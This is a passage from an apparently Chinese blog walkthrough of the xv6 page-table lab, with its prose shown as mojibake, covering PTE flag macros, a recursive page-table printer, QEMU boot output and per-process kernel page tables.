tableï¼Œä»¥åŠé‡Œé¢çš„PTEã€‚æ‰€ä»¥ï¼Œè¿™å°±æ˜¯åƒæ˜¯åœ¨æ•´ä¸ªè™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„ä¸€å¤§æ®µåœ°å€å®Œå…¨ä¸éœ€è¦æœ‰æ˜ å°„ä¸€æ ·ã€‚</p><p>3çº§page tableå°±åƒæ˜¯æŒ‰éœ€åˆ†é…è¿™äº›æ˜ å°„å—3çº§page tableå°±åƒæ˜¯æŒ‰éœ€åˆ†é…è¿™äº›æ˜ å°„å—</p></blockquote><p>å¯¹äºé¡µè¡¨çš„æ¯ä¸€é¡¹çš„å†…å®¹ï¼Œ<code>0~63</code>ä½å¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202304171551739.png"></p><p>xv6ä¸­å®šä¹‰çš„ä¸€äº›å®å¦‚ä¸‹ï¼Œå’Œpteä½œ<code>ä¸</code>è¿ç®—ä¹‹åå¯ä»¥å¾—åˆ°é¡µè¡¨çš„æŸä¸€ä½ï¼Œæ¯”å¦‚pte &amp; PTE_Vå¯ä»¥å¾—çŸ¥é¡µè¡¨æ˜¯å¦æœ‰æ•ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_V (1L &lt;&lt; 0) <span class="hljs-comment">// valid 00001</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_R (1L &lt;&lt; 1) <span class="hljs-comment">// readable 00010</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_W (1L &lt;&lt; 2) <span class="hljs-comment">// writeable00100</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE_X (1L &lt;&lt; 3) <span class="hljs-comment">// executable01000</span></span><br></code></pre></td></tr></table></figure><p>PA2PTE(pa)å°†è™šæ‹Ÿåœ°å€å³ç§»æˆªæ–­12ä½ä¹‹åå†å·¦ç§»10ä½ï¼Œå¯ä»¥å¾—åˆ°å¯¹åº”çš„é¡µè¡¨é¡¹</p><p>PTE2PA(pte)å°†é¡µè¡¨é¡¹å³ç§»æˆªæ–­10ä½ä¹‹åå†å·¦ç§»12ä½ï¼Œå¯ä»¥å¾—åˆ°å¯¹åº”çš„è™šæ‹Ÿåœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PA2PTE(pa) ((((uint64)pa) &gt;&gt; 12) &lt;&lt; 10)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PTE2PA(pte) (((pte) &gt;&gt; 10) &lt;&lt; 12)</span><br></code></pre></td></tr></table></figure><h2 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h2><p>åœ¨sh.cä¸­åŠ å…¥ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Execute cmd.  Never returns.*</span><br>__attribute__((noreturn)) <br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">runcmd</span><span class="hljs-params">(struct cmd *cmd)</span> </span>&#123;<br>.....<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·åšæ˜¯ä¸ºäº†é˜²æ­¢æŠ¥é€’å½’é”™</p><p>åœ¨exec.cä¸­åŠ å…¥ä¸‹é¢ä»£ç ï¼Œä»¥æ‰“å°å‡ºè¿›ç¨‹1çš„é¡µè¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(p-&gt;pid==<span class="hljs-number">1</span>) <br>  vmprint(p-&gt;pagetable);<br><br><span class="hljs-keyword">return</span> argc; <span class="hljs-comment">// this ends up in a0, the first argument to main(argc, argv)</span><br><br></code></pre></td></tr></table></figure><p>åœ¨ kernel/defs.h ä¸­å®šä¹‰ vmprint çš„åŸå‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// vm.c</span><br><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">dfs_vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> ,<span class="hljs-keyword">int</span> )</span></span>;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦åœ¨vm.cä¸­ç¼–å†™vmprintå‡½æ•°çš„ä»£ç </p><p>å…ˆè§‚å¯Ÿä¸€ä¸‹ç»™å‡ºçš„è¾“å‡º</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">page table 0x0000000087f6e000<br><span class="hljs-string">..0</span>: pte 0x0000000021fda801 pa 0x0000000087f6a000<br><span class="hljs-string">..</span> <span class="hljs-string">..0</span>: pte 0x0000000021fda401 pa 0x0000000087f69000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..0</span>: pte 0x0000000021fdac1f pa 0x0000000087f6b000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..1</span>: pte 0x0000000021fda00f pa 0x0000000087f68000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..2</span>: pte 0x0000000021fd9c1f pa 0x0000000087f67000<br><span class="hljs-string">..255</span>: pte 0x0000000021fdb401 pa 0x0000000087f6d000<br><span class="hljs-string">..</span> <span class="hljs-string">..511</span>: pte 0x0000000021fdb001 pa 0x0000000087f6c000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..510</span>: pte 0x0000000021fdd807 pa 0x0000000087f76000<br><span class="hljs-string">..</span> <span class="hljs-string">..</span> <span class="hljs-string">..511</span>: pte 0x0000000020001c0b pa 0x0000000080007000<br></code></pre></td></tr></table></figure><p>å¯¹è¯¥è¾“å‡ºæ ¼å¼çš„å‡ ç‚¹è§£é‡Šï¼š</p><ul><li>ç¬¬ä¸€è¡Œæ ¼å¼æ˜¯<code>page table %p</code>ï¼Œ%pæ˜¯ä¸€çº§é¡µè¡¨å…¥å£çš„åœ°å€ï¼Œ<code>pagetable[i]</code>å°±æ˜¯ä¸€çº§é¡µè¡¨ç¬¬ié¡¹</li><li>ç¬¬äºŒè¡Œå¼€å§‹ï¼Œæ˜¯dfsçš„ç»“æœã€‚ä»0åˆ°512è¿›è¡Œå¾ªç¯ï¼Œçœ‹pteæ˜¯å¦æœ‰æ•ˆï¼Œå¦‚æœæœ‰æ•ˆé‚£ä¹ˆæ‰¾åˆ°pteæŒ‡å‘çš„ä¸‹ä¸€ä¸ªæ¡ç›®ï¼Œç›´åˆ°æ‰¾åˆ°å¶å­èŠ‚ç‚¹</li><li>é¡¶çº§é¡µè¡¨é¡µé¢åªæœ‰æ¡ç›®0å’Œ255çš„æ˜ å°„ã€‚æ¡ç›®0çš„ä¸‹ä¸€ä¸ªçº§åˆ«çš„é¡µè¡¨åªæ˜ å°„äº†ç´¢å¼•0ï¼Œè€Œè¯¥ç´¢å¼•0çš„åº•å±‚åˆ™æ˜ å°„äº†æ¡ç›®0ã€1å’Œ2ã€‚é¡¶çº§é¡µè¡¨255åŒç†</li></ul><p>å…ˆå†™å‡ºvmprintå‡½æ•°ï¼ŒæŠŠç¬¬ä¸€è¡Œæ‰“å°å‡ºæ¥ï¼Œç„¶åè¿›å…¥dfså¾ªç¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;page table %p\n&quot;</span>, pagetable);<br>  dfs_vmprint(pagetable, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>pte &amp; PTE_V</code>ç”¨æ¥åˆ¤æ–­é¡µè¡¨æ˜¯å¦æœ‰æ•ˆï¼Œå¦‚æœæœ‰æ•ˆå°±å…ˆå°†å¯¹åº”çš„æ‰€æœ‰ä¿¡æ¯æ‰“å°å‡ºæ¥</p><p><code>pte &amp; (PTE_R|PTE_W|PTE_X)) == 0</code>ç”¨æ¥åˆ¤æ–­æ˜¯å¦æœ‰ä¸‹ä¸€çº§çš„é¡µè¡¨ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå°±å°†è¯¥pteè½¬åŒ–ä¸ºè™šæ‹Ÿåœ°å€ï¼Œè¿›å…¥é€’å½’</p><p>å†™è¿™éƒ¨åˆ†ä»£ç è¦ä»”ç»†å‚è€ƒé˜…è¯»æºç ä¸­çš„freewalkå‡½æ•°ï¼Œå¾ˆæœ‰å¸®åŠ©</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">dfs_vmprint</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> pagetable,<span class="hljs-keyword">int</span> level)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// there are 2^9 = 512 PTEs in a page table.</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">512</span>; i++)&#123;<br>    <span class="hljs-keyword">pte_t</span> pte = pagetable[i];<br>    <span class="hljs-keyword">if</span>((pte &amp; PTE_V))&#123;<span class="hljs-comment">//åªè¦æœ‰æ•ˆå°±æ‰“å°å‡ºæ¥</span><br>      <span class="hljs-comment">// this PTE points to a lower-level page table.</span><br>      <br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;..&quot;</span>);<span class="hljs-comment">//è¾“å‡º..çš„æ ¼å¼æ§åˆ¶</span><br>      <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;level;j++) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; ..&quot;</span>);<br>      <br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: pte %p pa %p\n&quot;</span>, i, pte, PTE2PA(pte));<span class="hljs-comment">//è¾“å‡ºé¡µè¡¨é¡¹ä¿¡æ¯</span><br>    <br>      <span class="hljs-keyword">if</span>((pte &amp; (PTE_R|PTE_W|PTE_X)) == <span class="hljs-number">0</span>)<span class="hljs-comment">//å¦‚æœæœ‰ä¸‹ä¸€çº§çš„é¡µè¡¨</span><br>      &#123;<br>        uint64 child = PTE2PA(pte);<br>        dfs_vmprint((<span class="hljs-keyword">pagetable_t</span>)child, level+<span class="hljs-number">1</span>);<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> make qemu</span><br>qemu-system-riscv64 -machine virt -bios none -kernel kernel/kernel -m 128M -smp 3 -nographic -drive file=fs.img,if=none,format=raw,id=x0 -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0<br><br>xv6 kernel is booting<br><br>hart 2 starting<br>hart 1 starting<br>page table 0x0000000087f6e000<br>..0: pte 0x0000000021fda801 pa 0x0000000087f6a000<br>.. ..0: pte 0x0000000021fda401 pa 0x0000000087f69000<br>.. .. ..0: pte 0x0000000021fdac1f pa 0x0000000087f6b000<br>.. .. ..1: pte 0x0000000021fda00f pa 0x0000000087f68000<br>.. .. ..2: pte 0x0000000021fd9c1f pa 0x0000000087f67000<br>..255: pte 0x0000000021fdb401 pa 0x0000000087f6d000<br>.. ..511: pte 0x0000000021fdb001 pa 0x0000000087f6c000<br>.. .. ..510: pte 0x0000000021fdd807 pa 0x0000000087f76000<br>.. .. ..511: pte 0x0000000020001c0b pa 0x0000000080007000<br>init: starting sh<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h2 id="A-kernel-page-table-per-process"><a href="#A-kernel-page-table-per-process" class="headerlink" title="A kernel page table per process"></a>A kernel page table per process</h2><p>Xv6åªæœ‰ä¸€ä¸ªå†…æ ¸é¡µè¡¨ï¼Œåªè¦åœ¨å†…æ ¸ä¸­æ‰§è¡Œï¼Œå°±ä¼šä½¿ç”¨å®ƒã€‚å†…æ ¸é¡µè¡¨æ˜¯ç‰©ç†åœ°å€çš„ç›´æ¥æ˜ å°„ï¼Œä¹Ÿå³æ˜¯å†…æ ¸è™šæ‹Ÿåœ°å€ x æ˜ å°„åˆ°ç‰©ç†åœ°å€ xã€‚æ¯ä¸ªè¿›ç¨‹ä¹Ÿä¼šæœ‰è‡ªå·±çš„ç”¨æˆ·é¡µè¡¨ï¼Œè¯¥é¡µè¡¨åªåŒ…å«æ­¤è¿›ç¨‹çš„ç”¨æˆ·ç©ºé—´çš„åœ°å€æ˜ å°„ã€‚è€Œè¿™äº›ç”¨æˆ·é¡µè¡¨å’Œç”¨æˆ·åœ°å€åœ¨å†…æ ¸é¡µè¡¨ä¸­æ˜¯ä¸å­˜åœ¨çš„ã€‚å› æ­¤å°±ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼šå‡è®¾ç”¨æˆ·è¿›ç¨‹è°ƒç”¨writeç³»ç»Ÿè°ƒç”¨å¹¶ä¼ é€’ä¸€ä¸ªæŒ‡é’ˆï¼Œç”±äºè¯¥æŒ‡é’ˆæ˜¯ç”¨æˆ·çº§çš„åœ°å€ï¼Œåœ¨å†…æ ¸ä¸­æ˜¯æ— æ•ˆçš„ï¼Œå› æ­¤å®é™…è¿‡ç¨‹ä¸­ä¼šå…ˆå°†ç”¨æˆ·çº§çš„è™šæ‹Ÿåœ°å€è½¬æ¢ä¸ºç‰©ç†åœ°å€ï¼Œè¿™æ ·å°±ä¼šé€ æˆä¸€å®šç¨‹åº¦çš„å¼€é”€ã€‚æœ¬ä»»åŠ¡å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œè®©æ¯ä¸ªç”¨æˆ·çº§çš„è¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªå†…æ ¸é¡µè¡¨</p><p><strong>ä»»åŠ¡ï¼šä¿®æ”¹å†…æ ¸ï¼Œä»¥ä¾¿æ¯ä¸ªè¿›ç¨‹åœ¨å†…æ ¸ä¸­æ‰§è¡Œæ—¶ä½¿ç”¨å…¶è‡ªå·±çš„å†…æ ¸é¡µè¡¨å‰¯æœ¬</strong></p><p>æˆ‘ä»¬è‡ªç„¶æƒ³åˆ°è¦åœ¨ <code>struct proc</code>ä¸­åŠ ä¸Šè¿›ç¨‹çš„å†…æ ¸é¡µè¡¨æ¡ç›® kpgtable</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <span class="hljs-keyword">pagetable_t</span> kpgtable;        <span class="hljs-comment">// Kernel page table</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>åé¢è¦ç”¨çš„å‡ ä¸ªé‡è¦å‡½æ•°</p><table><thead><tr><th>å‡½æ•°åç§°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>walk</td><td>é€šè¿‡è™šæ‹Ÿåœ°å€å¾—åˆ° PTE</td></tr><tr><td>mappages</td><td>å°†è™šæ‹Ÿåœ°å€æ˜ å°„åˆ°ç‰©ç†åœ°å€</td></tr><tr><td>copyin</td><td>å°†ç”¨æˆ·è™šæ‹Ÿåœ°å€çš„æ•°æ®å¤åˆ¶åˆ°å†…æ ¸ç©ºé—´åœ°å€</td></tr><tr><td>copyout</td><td>å°†å†…æ ¸æ•°æ®å¤åˆ¶åˆ°ç”¨æˆ·è™šæ‹Ÿåœ°å€</td></tr><tr><td>kvminit</td><td>åˆ›å»ºå†…æ ¸çš„é¡µè¡¨ï¼Œå¯¹å…¨å±€çš„<code>kernel_pagetable</code>è¿›è¡Œæ˜ å°„</td></tr><tr><td>kvmmap</td><td>è°ƒç”¨ mappagesï¼Œå°†ä¸€ä¸ªè™šæ‹Ÿåœ°å€èŒƒå›´æ˜ å°„åˆ°ä¸€ä¸ªç‰©ç†åœ°å€èŒƒå›´</td></tr><tr><td>kvminithart</td><td>æ˜ å°„å†…æ ¸é¡µè¡¨ã€‚å®ƒå°†æ ¹é¡µè¡¨é¡µçš„ç‰©ç†åœ°å€å†™å…¥å¯„å­˜å™¨ satp ä¸­</td></tr><tr><td>procinit</td><td>ä¸ºæ¯ä¸ªè¿›ç¨‹åˆ†é…ä¸€ä¸ªå†…æ ¸æ ˆ</td></tr><tr><td>kalloc</td><td>åˆ†é…ç‰©ç†é¡µ</td></tr><tr><td>proc_pagetable(struct proc *<em>p</em>)</td><td>ä¸ºç»™å®šçš„è¿›ç¨‹åˆ›å»ºç”¨æˆ·æ€é¡µè¡¨</td></tr><tr><td>kvminithart</td><td>æ˜ å°„å†…æ ¸é¡µè¡¨ã€‚å®ƒå°†æ ¹é¡µè¡¨é¡µçš„ç‰©ç†åœ°å€å†™å…¥å¯„å­˜å™¨ satp ä¸­</td></tr></tbody></table><p>ç›¸å…³å‡½æ•°è°ƒç”¨é“¾ï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">main <br><span class="hljs-function"><span class="hljs-title">kvminit</span> -&gt;</span> kvmmap<br>procinit<br><span class="hljs-function"><span class="hljs-title">userinit</span> -&gt;</span> allocproc<br></code></pre></td></tr></table></figure><p>ä¹‹åï¼Œæˆ‘ä»¬è¦å¯¹è¿›ç¨‹çš„å†…æ ¸é¡µè¡¨è¿›è¡Œåˆå§‹åŒ–</p><p>å‚è€ƒkvminitå‡½æ•°å’Œkvmmapå‡½æ•°ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ç”¨æ¥æ·»åŠ å¯¹å…¨å±€kernel_pagetableçš„æ˜ å°„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * create a direct-map page table for the kernel.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">kvminit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  kernel_pagetable = (<span class="hljs-keyword">pagetable_t</span>) kalloc();<br>  <span class="hljs-built_in">memset</span>(kernel_pagetable, <span class="hljs-number">0</span>, PGSIZE);<br><br>  <span class="hljs-comment">// uart registers</span><br>  kvmmap(UART0, UART0, PGSIZE, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// virtio mmio disk interface</span><br>  kvmmap(VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// CLINT</span><br>  kvmmap(CLINT, CLINT, <span class="hljs-number">0x10000</span>, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// PLIC</span><br>  kvmmap(PLIC, PLIC, <span class="hljs-number">0x400000</span>, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// map kernel text executable and read-only.</span><br>  kvmmap(KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);<br><br>  <span class="hljs-comment">// map kernel data and the physical RAM we&#x27;ll make use of.</span><br>  kvmmap((uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);<br><br>  <span class="hljs-comment">// map the trampoline for trap entry/exit to</span><br>  <span class="hljs-comment">// the highest virtual address in the kernel.</span><br>  kvmmap(TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);<br>&#125;<br><br><span class="hljs-comment">// add a mapping to the kernel page table.</span><br><span class="hljs-comment">// only used when booting.</span><br><span class="hljs-comment">// does not flush TLB or enable paging.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">kvmmap</span><span class="hljs-params">(uint64 va, uint64 pa, uint64 sz, <span class="hljs-keyword">int</span> perm)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(mappages(kernel_pagetable, va, sz, pa, perm) != <span class="hljs-number">0</span>)<br>    panic(<span class="hljs-string">&quot;kvmmap&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬åˆ›å»ºukvmmapå’Œukvminitè¿™ä¸¤ä¸ªå‡½æ•°ï¼Œå®Œæˆå¯¹è¿›ç¨‹ç»“æ„ä½“ä¸­çš„å†…æ ¸é¡µè¡¨çš„æ˜ å°„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">ukvmmap</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> kpgtable,uint64 va, uint64 pa, uint64 sz, <span class="hljs-keyword">int</span> perm)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">if</span>(mappages(kpgtable, va, sz, pa, perm) != <span class="hljs-number">0</span>)<br>    panic(<span class="hljs-string">&quot;ukvmmap&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">pagetable_t</span></span><br><span class="hljs-function"><span class="hljs-title">ukvminit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">pagetable_t</span> kpgtable=(<span class="hljs-keyword">pagetable_t</span>) kalloc();<br>  <span class="hljs-built_in">memset</span>(kpgtable, <span class="hljs-number">0</span>, PGSIZE);<br>  ukvmmap(kpgtable, UART0, UART0, PGSIZE, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, CLINT, CLINT, <span class="hljs-number">0x10000</span>, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, PLIC, PLIC, <span class="hljs-number">0x400000</span>, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);<br>  ukvmmap(kpgtable, (uint64)etext, (uint64)etext, PHYSTOP-(uint64)etext, PTE_R | PTE_W);<br>  ukvmmap(kpgtable, TRAMPOLINE, (uint64)trampoline, PGSIZE, PTE_R | PTE_X);<br>  <span class="hljs-keyword">return</span> kpgtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨defs.hä¸­éœ€è¦æ·»åŠ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span>            <span class="hljs-title">ukvmmap</span><span class="hljs-params">(<span class="hljs-keyword">pagetable_t</span> ,uint64 , uint64 , uint64 , <span class="hljs-keyword">int</span> )</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">pagetable_t</span>     <span class="hljs-title">ukvminit</span><span class="hljs-params">()</span></span>;<br></code></pre></td></tr></table></figure><p>æ ¹æ®å‰é¢å‡½æ•°è°ƒç”¨çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªmainä¸­userinit -&gt; 